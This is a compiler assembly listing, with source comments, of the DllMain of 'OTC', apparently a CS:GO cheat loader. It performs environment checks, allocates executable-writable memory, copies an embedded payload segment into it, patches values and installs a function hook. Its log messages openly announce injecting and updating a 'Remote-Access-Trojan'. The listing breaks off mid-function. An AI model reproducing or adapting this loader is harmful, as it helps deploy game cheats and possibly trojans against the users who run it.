  000c4	66 0f d6 45 d8	 movq	 QWORD PTR _logger$41[ebp+16], xmm0
  000c9	0f 11 45 c8	 movups	 XMMWORD PTR _logger$41[ebp], xmm0
  000cd	e8 00 00 00 00	 call	 ??0Logger@@QAE@W4LoggerType@0@@Z ; Logger::Logger
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\runtime\RuntimeHandler.h

; 9    :     RuntimeHandler (Segment& segment) : m_Segment (segment) {}

  000d2	8d 45 90	 lea	 eax, DWORD PTR _segment$40[ebp]
  000d5	89 85 70 fe ff
	ff		 mov	 DWORD PTR _runtime$37[ebp], eax
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 4    :     if (variable && value) {

  000db	8b 45 08	 mov	 eax, DWORD PTR _module$[ebp]
  000de	85 c0		 test	 eax, eax
  000e0	0f 84 70 05 00
	00		 je	 $LN81@DllMain

; 5    :         *variable = value;

  000e6	a3 00 00 00 00	 mov	 DWORD PTR ?UnsafeLibraryPointer@Segment@@2KA, eax ; Segment::UnsafeLibraryPointer
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 39   :         logger.Info ("OTC");

  000eb	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  000ee	68 00 00 00 00	 push	 OFFSET ??_C@_03KNCNPCCC@OTC@
  000f3	50		 push	 eax
  000f4	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp

; 17   : 	switch (m_Type) {

  000f9	8b 45 dc	 mov	 eax, DWORD PTR _logger$41[ebp+20]
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 39   :         logger.Info ("OTC");

  000fc	83 c4 08	 add	 esp, 8
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp

; 17   : 	switch (m_Type) {

  000ff	83 e8 00	 sub	 eax, 0
  00102	74 23		 je	 SHORT $LN87@DllMain
  00104	83 e8 01	 sub	 eax, 1
  00107	75 36		 jne	 SHORT $LN92@DllMain

; 21   : 		  break;
; 22   : 
; 23   : 		case FILE:
; 24   : 			GLoggerFile << "\n" << std::endl;

  00109	ba 00 00 00 00	 mov	 edx, OFFSET ??_C@_01EEMJAFIK@?6@
  0010e	b9 00 00 00 00	 mov	 ecx, OFFSET ?GLoggerFile@@3V?$basic_ofstream@DU?$char_traits@D@std@@@std@@A ; GLoggerFile
  00113	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00118	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  0011d	8b c8		 mov	 ecx, eax
  0011f	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z
  00125	eb 18		 jmp	 SHORT $LN92@DllMain
$LN87@DllMain:

; 18   : 
; 19   : 	    case CONSOLE:
; 20   : 		   m_Game.PrintNewLineToConsole (count);

  00127	8b 7d c8	 mov	 edi, DWORD PTR _logger$41[ebp]
  0012a	be 02 00 00 00	 mov	 esi, 2
  0012f	90		 npad	 1
$LL93@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\GameFramework.cpp

; 4    : 	for (int lineIterator = 0; lineIterator < newLineCount; lineIterator++) m_PrintInterface ("\n");

  00130	68 00 00 00 00	 push	 OFFSET ??_C@_01EEMJAFIK@?6@
  00135	ff d7		 call	 edi
  00137	83 c4 04	 add	 esp, 4
  0013a	83 ee 01	 sub	 esi, 1
  0013d	75 f1		 jne	 SHORT $LL93@DllMain
$LN92@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 44   :         logger.Info ("Loading up OTC.. ");

  0013f	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  00142	68 00 00 00 00	 push	 OFFSET ??_C@_0BC@BMFENILA@Loading?5up?5OTC?4?4?5@
  00147	50		 push	 eax
  00148	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp

; 17   : 	switch (m_Type) {

  0014d	8b 45 dc	 mov	 eax, DWORD PTR _logger$41[ebp+20]
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 44   :         logger.Info ("Loading up OTC.. ");

  00150	83 c4 08	 add	 esp, 8
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp

; 17   : 	switch (m_Type) {

  00153	83 e8 00	 sub	 eax, 0
  00156	74 23		 je	 SHORT $LN98@DllMain
  00158	83 e8 01	 sub	 eax, 1
  0015b	75 29		 jne	 SHORT $LN103@DllMain

; 21   : 		  break;
; 22   : 
; 23   : 		case FILE:
; 24   : 			GLoggerFile << "\n" << std::endl;

  0015d	ba 00 00 00 00	 mov	 edx, OFFSET ??_C@_01EEMJAFIK@?6@
  00162	b9 00 00 00 00	 mov	 ecx, OFFSET ?GLoggerFile@@3V?$basic_ofstream@DU?$char_traits@D@std@@@std@@A ; GLoggerFile
  00167	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  0016c	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  00171	8b c8		 mov	 ecx, eax
  00173	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z
  00179	eb 0b		 jmp	 SHORT $LN103@DllMain
$LN98@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\GameFramework.cpp

; 4    : 	for (int lineIterator = 0; lineIterator < newLineCount; lineIterator++) m_PrintInterface ("\n");

  0017b	68 00 00 00 00	 push	 OFFSET ??_C@_01EEMJAFIK@?6@
  00180	ff 55 c8	 call	 DWORD PTR _logger$41[ebp]
  00183	83 c4 04	 add	 esp, 4
$LN103@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 48   :         logger.Info ("| [~] Performing basic checks...");

  00186	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  00189	68 00 00 00 00	 push	 OFFSET ??_C@_0CB@PONPHMNH@?$HM?5?$FL?$HO?$FN?5Performing?5basic?5checks?4?4@
  0018e	50		 push	 eax
  0018f	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\Utils.cpp

; 137  :     ZeroMemory (&osVersionInfo, sizeof (OSVERSIONINFO));

  00194	68 14 01 00 00	 push	 276			; 00000114H
  00199	8d 85 7c fe ff
	ff		 lea	 eax, DWORD PTR _osVersionInfo$39[ebp]
  0019f	6a 00		 push	 0
  001a1	50		 push	 eax
  001a2	e8 00 00 00 00	 call	 _memset

; 138  : 
; 139  :     //This causes a little confused. 
; 140  :     //
; 141  :     //If we were unable to fill the structure, then we return true, because the function expects false, 
; 142  :     //this will lead to the fact that the initialization of the loader simply stops, and through the debugger you can see what is wrong. 
; 143  :     if (GetVersionEx (&osVersionInfo)) return true;

  001a7	8b 35 00 00 00
	00		 mov	 esi, DWORD PTR __imp__GetVersionExW@4
  001ad	8d 85 7c fe ff
	ff		 lea	 eax, DWORD PTR _osVersionInfo$39[ebp]
  001b3	83 c4 14	 add	 esp, 20			; 00000014H
  001b6	50		 push	 eax
  001b7	ff d6		 call	 esi
  001b9	85 c0		 test	 eax, eax
  001bb	0f 85 60 04 00
	00		 jne	 $LN4@DllMain

; 144  : 
; 145  :     return ((osVersionInfo.dwMajorVersion > 5) || ((osVersionInfo.dwMajorVersion == 5) && (osVersionInfo.dwMinorVersion >= 1)));

  001c1	83 bd 80 fe ff
	ff 05		 cmp	 DWORD PTR _osVersionInfo$39[ebp+4], 5
  001c8	0f 87 53 04 00
	00		 ja	 $LN4@DllMain
  001ce	75 0d		 jne	 SHORT $LN290@DllMain
  001d0	83 bd 84 fe ff
	ff 01		 cmp	 DWORD PTR _osVersionInfo$39[ebp+8], 1
  001d7	0f 83 44 04 00
	00		 jae	 $LN4@DllMain
$LN290@DllMain:

; 152  :     ZeroMemory (&osVersionInfo, sizeof(OSVERSIONINFO));

  001dd	68 14 01 00 00	 push	 276			; 00000114H
  001e2	8d 85 74 fe ff
	ff		 lea	 eax, DWORD PTR _osVersionInfo$38[ebp]
  001e8	6a 00		 push	 0
  001ea	50		 push	 eax
  001eb	e8 00 00 00 00	 call	 _memset
  001f0	83 c4 0c	 add	 esp, 12			; 0000000cH

; 153  : 
; 154  :     //This causes a little confused. 
; 155  :     //
; 156  :     //If we were unable to fill the structure, then we return true, because the function expects false, 
; 157  :     //this will lead to the fact that the initialization of the loader simply stops, and through the debugger you can see what is wrong.
; 158  :     if (GetVersionEx ((LPOSVERSIONINFO) &osVersionInfo)) return true;

  001f3	8d 85 74 fe ff
	ff		 lea	 eax, DWORD PTR _osVersionInfo$38[ebp]
  001f9	50		 push	 eax
  001fa	ff d6		 call	 esi
  001fc	85 c0		 test	 eax, eax
  001fe	0f 85 1d 04 00
	00		 jne	 $LN4@DllMain
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 51   :         if (Utils::IsWinXPOrLater () || Utils::IsWinServBuild ()) {

  00204	80 7d 8e 01	 cmp	 BYTE PTR _osVersionInfo$38[ebp+282], 1
  00208	0f 84 13 04 00
	00		 je	 $LN4@DllMain

; 54   :            return FALSE;
; 55   :         }
; 56   : 
; 57   :         logger.Info ("| [+] Your windows version meets the requirements for running OTC.");

  0020e	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  00211	68 00 00 00 00	 push	 OFFSET ??_C@_0ED@EOFJBFEH@?$HM?5?$FL?$CL?$FN?5Your?5windows?5version?5meet@
  00216	50		 push	 eax
  00217	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info
  0021c	83 c4 08	 add	 esp, 8

; 58   :         
; 59   :         //Pretty common issue.
; 60   :         if (!Utils::IsRedistPackagePresent ()) {

  0021f	e8 00 00 00 00	 call	 ?IsRedistPackagePresent@Utils@@SA_NXZ ; Utils::IsRedistPackagePresent
  00224	84 c0		 test	 al, al
  00226	75 0f		 jne	 SHORT $LN5@DllMain

; 61   :             logger.Info ("| [-] Could not find the msvc redist package installed on your system.");
; 62   :             logger.Info ("| [~] You can download and install the redist build from here: https://www.microsoft.com/en-us/download/confirmation.aspx?id=52685.");
; 63   :             return FALSE;

  00228	be 00 00 00 00	 mov	 esi, OFFSET ??_C@_0IE@MADIDBIL@?$HM?5?$FL?$HO?$FN?5You?5can?5download?5and?5inst@
  0022d	b8 00 00 00 00	 mov	 eax, OFFSET ??_C@_0EH@PFJPAFGG@?$HM?5?$FL?9?$FN?5Could?5not?5find?5the?5msvc?5r@
  00232	e9 f4 03 00 00	 jmp	 $LN14@DllMain
$LN5@DllMain:

; 64   :         }
; 65   : 
; 66   :         logger.Info ("| [+] Found the required msvc redist build on your system.");

  00237	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  0023a	68 00 00 00 00	 push	 OFFSET ??_C@_0DL@KKGOFNJE@?$HM?5?$FL?$CL?$FN?5Found?5the?5required?5msvc?5r@
  0023f	50		 push	 eax
  00240	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info

; 67   :         logger.Info ("| [+] All checks passed.");

  00245	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  00248	68 00 00 00 00	 push	 OFFSET ??_C@_0BJ@DNOPFKIA@?$HM?5?$FL?$CL?$FN?5All?5checks?5passed?4@
  0024d	50		 push	 eax
  0024e	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp

; 17   : 	switch (m_Type) {

  00253	8b 45 dc	 mov	 eax, DWORD PTR _logger$41[ebp+20]
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 67   :         logger.Info ("| [+] All checks passed.");

  00256	83 c4 10	 add	 esp, 16			; 00000010H
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp

; 17   : 	switch (m_Type) {

  00259	83 e8 00	 sub	 eax, 0
  0025c	74 23		 je	 SHORT $LN124@DllMain
  0025e	83 e8 01	 sub	 eax, 1
  00261	75 29		 jne	 SHORT $LN129@DllMain

; 21   : 		  break;
; 22   : 
; 23   : 		case FILE:
; 24   : 			GLoggerFile << "\n" << std::endl;

  00263	ba 00 00 00 00	 mov	 edx, OFFSET ??_C@_01EEMJAFIK@?6@
  00268	b9 00 00 00 00	 mov	 ecx, OFFSET ?GLoggerFile@@3V?$basic_ofstream@DU?$char_traits@D@std@@@std@@A ; GLoggerFile
  0026d	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00272	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  00277	8b c8		 mov	 ecx, eax
  00279	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z
  0027f	eb 0b		 jmp	 SHORT $LN129@DllMain
$LN124@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\GameFramework.cpp

; 4    : 	for (int lineIterator = 0; lineIterator < newLineCount; lineIterator++) m_PrintInterface ("\n");

  00281	68 00 00 00 00	 push	 OFFSET ??_C@_01EEMJAFIK@?6@
  00286	ff 55 c8	 call	 DWORD PTR _logger$41[ebp]
  00289	83 c4 04	 add	 esp, 4
$LN129@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 71   :         logger.Info ("| [~] Extracting segment to memory....");

  0028c	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  0028f	68 00 00 00 00	 push	 OFFSET ??_C@_0CH@MHEJMGJD@?$HM?5?$FL?$HO?$FN?5Extracting?5segment?5to?5mem@
  00294	50		 push	 eax
  00295	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info
  0029a	83 c4 08	 add	 esp, 8
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\RuntimeHandler.cpp

; 5    :     PanicUtils::SetImportant (&Segment::UnsafeAllocatedPointer, reinterpret_cast<DWORD> (VirtualAlloc (NULL, SegmentHeader::Datacase::ALLOCATION, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)));

  0029d	6a 40		 push	 64			; 00000040H
  0029f	68 00 30 00 00	 push	 12288			; 00003000H
  002a4	68 40 89 96 00	 push	 9865536			; 00968940H
  002a9	6a 00		 push	 0
  002ab	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__VirtualAlloc@16
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 4    :     if (variable && value) {

  002b1	85 c0		 test	 eax, eax
  002b3	0f 84 9d 03 00
	00		 je	 $LN81@DllMain
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\RuntimeHandler.cpp

; 8    :     PanicUtils::RequireNonNull (PanicUtils::Layers::INIT, reinterpret_cast<DWORD> (memcpy (reinterpret_cast<PVOID> (Segment::GetSafeAllocationPointer()), SegmentData, SegmentHeader::Datacase::SIZE)), "Allocated memory pointer is null");

  002b9	68 00 6a 18 00	 push	 1600000			; 00186a00H
  002be	68 00 00 00 00	 push	 OFFSET ?SegmentData@@3QBEB ; SegmentData
  002c3	50		 push	 eax
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 5    :         *variable = value;

  002c4	a3 00 00 00 00	 mov	 DWORD PTR ?UnsafeAllocatedPointer@Segment@@2KA, eax ; Segment::UnsafeAllocatedPointer
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\RuntimeHandler.cpp

; 8    :     PanicUtils::RequireNonNull (PanicUtils::Layers::INIT, reinterpret_cast<DWORD> (memcpy (reinterpret_cast<PVOID> (Segment::GetSafeAllocationPointer()), SegmentData, SegmentHeader::Datacase::SIZE)), "Allocated memory pointer is null");

  002c9	e8 00 00 00 00	 call	 _memcpy
  002ce	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 13   :     if (!value) {

  002d1	85 c0		 test	 eax, eax
  002d3	0f 84 8c 03 00
	00		 je	 $LN295@DllMain
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 75   :         logger.Info ("| [~] Reconstructing hot-points...");

  002d9	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  002dc	68 00 00 00 00	 push	 OFFSET ??_C@_0CD@CAFJDLOK@?$HM?5?$FL?$HO?$FN?5Reconstructing?5hot?9points@
  002e1	50		 push	 eax
  002e2	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info
  002e7	83 c4 08	 add	 esp, 8

; 76   : 
; 77   :         runtime.ReconstructHotPoints ();

  002ea	8d 8d 70 fe ff
	ff		 lea	 ecx, DWORD PTR _runtime$37[ebp]
  002f0	e8 00 00 00 00	 call	 ?ReconstructHotPoints@RuntimeHandler@@QAEXXZ ; RuntimeHandler::ReconstructHotPoints

; 78   :         
; 79   :         logger.Info ("| [+] Wait until the Remote-Access-Trojan is injected...");

  002f5	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  002f8	68 00 00 00 00	 push	 OFFSET ??_C@_0DJ@EPKKPONP@?$HM?5?$FL?$CL?$FN?5Wait?5until?5the?5Remote?9Acc@
  002fd	50		 push	 eax
  002fe	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info

; 80   : 
; 81   :         logger.Info ("| [~] Filling the DNS Server Info... (~7-15 sec)");

  00303	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  00306	68 00 00 00 00	 push	 OFFSET ??_C@_0DB@PEHHJAKP@?$HM?5?$FL?$HO?$FN?5Filling?5the?5DNS?5Server?5In@
  0030b	50		 push	 eax
  0030c	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info
  00311	83 c4 10	 add	 esp, 16			; 00000010H

; 82   : 
; 83   :         segment.GetFramework().CreateDependencyTable ();

  00314	8d 85 4c fe ff
	ff		 lea	 eax, DWORD PTR $T18[ebp]
  0031a	8d 4d 90	 lea	 ecx, DWORD PTR _segment$40[ebp]
  0031d	50		 push	 eax
  0031e	e8 00 00 00 00	 call	 ?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ ; Segment::GetFramework
  00323	8b c8		 mov	 ecx, eax
  00325	c6 45 fc 04	 mov	 BYTE PTR __$EHRec$[ebp+8], 4
  00329	e8 00 00 00 00	 call	 ?CreateDependencyTable@SegmentFramework@@QAEXXZ ; SegmentFramework::CreateDependencyTable
  0032e	8d 8d 4c fe ff
	ff		 lea	 ecx, DWORD PTR $T18[ebp]
  00334	c6 45 fc 03	 mov	 BYTE PTR __$EHRec$[ebp+8], 3
  00338	e8 00 00 00 00	 call	 ??1SegmentFramework@@QAE@XZ

; 84   : 
; 85   :         logger.Info ("| [~] Updating DNS...");

  0033d	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  00340	68 00 00 00 00	 push	 OFFSET ??_C@_0BG@PPFIICFP@?$HM?5?$FL?$HO?$FN?5Updating?5DNS?4?4?4@
  00345	50		 push	 eax
  00346	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info
  0034b	83 c4 08	 add	 esp, 8

; 87   :         segment.GetFramework().UpdateNetVars ();

  0034e	8d 85 4c fe ff
	ff		 lea	 eax, DWORD PTR $T19[ebp]
  00354	8d 4d 90	 lea	 ecx, DWORD PTR _segment$40[ebp]
  00357	50		 push	 eax
  00358	e8 00 00 00 00	 call	 ?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ ; Segment::GetFramework
  0035d	c6 45 fc 05	 mov	 BYTE PTR __$EHRec$[ebp+8], 5
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp

; 54   :     for (const auto& netvar : m_netvars) {

  00361	8b 08		 mov	 ecx, DWORD PTR [eax]
  00363	8b 78 04	 mov	 edi, DWORD PTR [eax+4]
  00366	3b cf		 cmp	 ecx, edi
  00368	74 23		 je	 SHORT $LN150@DllMain
  0036a	66 0f 1f 44 00
	00		 npad	 6
$LL151@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 13   :     if (!value) {

  00370	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?UnsafeAllocatedPointer@Segment@@2KA ; Segment::UnsafeAllocatedPointer
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp

; 55   :         *reinterpret_cast<DWORD*> (Segment::GetSafeAllocationPointer () + netvar.rva) = netvar.new_value;

  00376	8b 71 04	 mov	 esi, DWORD PTR [ecx+4]
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 13   :     if (!value) {

  00379	85 d2		 test	 edx, edx
  0037b	0f 84 f0 02 00
	00		 je	 $LN265@DllMain
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp

; 54   :     for (const auto& netvar : m_netvars) {

  00381	8b 01		 mov	 eax, DWORD PTR [ecx]
  00383	83 c1 08	 add	 ecx, 8

; 55   :         *reinterpret_cast<DWORD*> (Segment::GetSafeAllocationPointer () + netvar.rva) = netvar.new_value;

  00386	89 34 02	 mov	 DWORD PTR [edx+eax], esi
  00389	3b cf		 cmp	 ecx, edi
  0038b	75 e3		 jne	 SHORT $LL151@DllMain
$LN150@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 87   :         segment.GetFramework().UpdateNetVars ();

  0038d	8d 8d 4c fe ff
	ff		 lea	 ecx, DWORD PTR $T19[ebp]
  00393	c6 45 fc 03	 mov	 BYTE PTR __$EHRec$[ebp+8], 3
  00397	e8 00 00 00 00	 call	 ??1SegmentFramework@@QAE@XZ

; 88   : 
; 89   :         logger.Info ("| [~] Creating STUB for Remote-Access-Trojan...");

  0039c	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  0039f	68 00 00 00 00	 push	 OFFSET ??_C@_0DA@NAIALJDJ@?$HM?5?$FL?$HO?$FN?5Creating?5STUB?5for?5Remote?9@
  003a4	50		 push	 eax
  003a5	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info
  003aa	83 c4 08	 add	 esp, 8

; 91   :         segment.GetFramework().CreateHook ();

  003ad	8d 85 4c fe ff
	ff		 lea	 eax, DWORD PTR $T22[ebp]
  003b3	8d 4d 90	 lea	 ecx, DWORD PTR _segment$40[ebp]
  003b6	50		 push	 eax
  003b7	e8 00 00 00 00	 call	 ?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ ; Segment::GetFramework
  003bc	c6 45 fc 06	 mov	 BYTE PTR __$EHRec$[ebp+8], 6
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 13   :     if (!value) {

  003c0	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?UnsafeAllocatedPointer@Segment@@2KA ; Segment::UnsafeAllocatedPointer
  003c6	85 c9		 test	 ecx, ecx
  003c8	0f 84 a3 02 00
	00		 je	 $LN265@DllMain
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\libs\libs\HookLib\HookLib\HookLib\HookLib.c

; 851  :     return SetHookUm(Target, Interceptor, Original);

  003ce	51		 push	 ecx
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp

; 77   :       SetHook (reinterpret_cast<PVOID> (Segment::GetSafeAllocationPointer() + Datacase::VIRTUAL_EXECUTOR_RVA), &CustomVirtualCaller, reinterpret_cast<PVOID*> (&OriginalVirtualCaller)); //

  003cf	81 c1 30 3b 00
	00		 add	 ecx, 15152		; 00003b30H
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\libs\libs\HookLib\HookLib\HookLib\HookLib.c

; 851  :     return SetHookUm(Target, Interceptor, Original);

  003d5	e8 00 00 00 00	 call	 _SetHookUm
  003da	83 c4 04	 add	 esp, 4
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 91   :         segment.GetFramework().CreateHook ();

  003dd	c6 45 fc 03	 mov	 BYTE PTR __$EHRec$[ebp+8], 3
  003e1	8d 8d 4c fe ff
	ff		 lea	 ecx, DWORD PTR $T22[ebp]
  003e7	e8 00 00 00 00	 call	 ??1SegmentFramework@@QAE@XZ

; 92   : 
; 93   :         logger.Info ("| [~] Updating Remote-Access-Trojan...");

  003ec	8d 45 c8	 lea	 eax, DWORD PTR _logger$41[ebp]
  003ef	68 00 00 00 00	 push	 OFFSET ??_C@_0CH@IEOFEGDJ@?$HM?5?$FL?$HO?$FN?5Updating?5Remote?9Access?9Tr@
  003f4	50		 push	 eax
  003f5	e8 00 00 00 00	 call	 ?Info@Logger@@QAAXPBDZZ	; Logger::Info
  003fa	83 c4 08	 add	 esp, 8

; 97   :         segment.GetFramework().UpdateWatermark (getenv ("USERNAME"), "Neonik");

  003fd	8d 85 4c fe ff
	ff		 lea	 eax, DWORD PTR $T24[ebp]
  00403	8d 4d 90	 lea	 ecx, DWORD PTR _segment$40[ebp]
  00406	50		 push	 eax
  00407	e8 00 00 00 00	 call	 ?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ ; Segment::GetFramework
  0040c	68 00 00 00 00	 push	 OFFSET ??_C@_08JMMIJEMM@USERNAME@
  00411	c6 45 fc 07	 mov	 BYTE PTR __$EHRec$[ebp+8], 7
  00415	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__getenv
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp

; 114  :        std::strncpy (watermark, mark, 16);                                                                                                                       //

  0041b	8b 3d 00 00 00
	00		 mov	 edi, DWORD PTR __imp__strncpy
  00421	6a 10		 push	 16			; 00000010H
  00423	50		 push	 eax
  00424	8d 45 e0	 lea	 eax, DWORD PTR _watermark$42[ebp]
  00427	50		 push	 eax
  00428	ff d7		 call	 edi
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 13   :     if (!value) {

  0042a	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?UnsafeAllocatedPointer@Segment@@2KA ; Segment::UnsafeAllocatedPointer
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp

; 114  :        std::strncpy (watermark, mark, 16);                                                                                                                       //

  00430	83 c4 10	 add	 esp, 16			; 00000010H
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp

; 13   :     if (!value) {

  00433	85 d2		 test	 edx, edx
  00435	0f 84 36 02 00
	00		 je	 $LN265@DllMain
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\Segment.h

; 25   : 		return UnsafeAllocatedPointer;

  0043b	8d 4d e0	 lea	 ecx, DWORD PTR _watermark$42[ebp]
  0043e	81 c2 81 d3 12
	00		 add	 edx, 1233793		; 0012d381H
  00444	be 04 00 00 00	 mov	 esi, 4
  00449	0f 1f 80 00 00
	00 00		 npad	 7
$LL183@DllMain:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\Utils.cpp

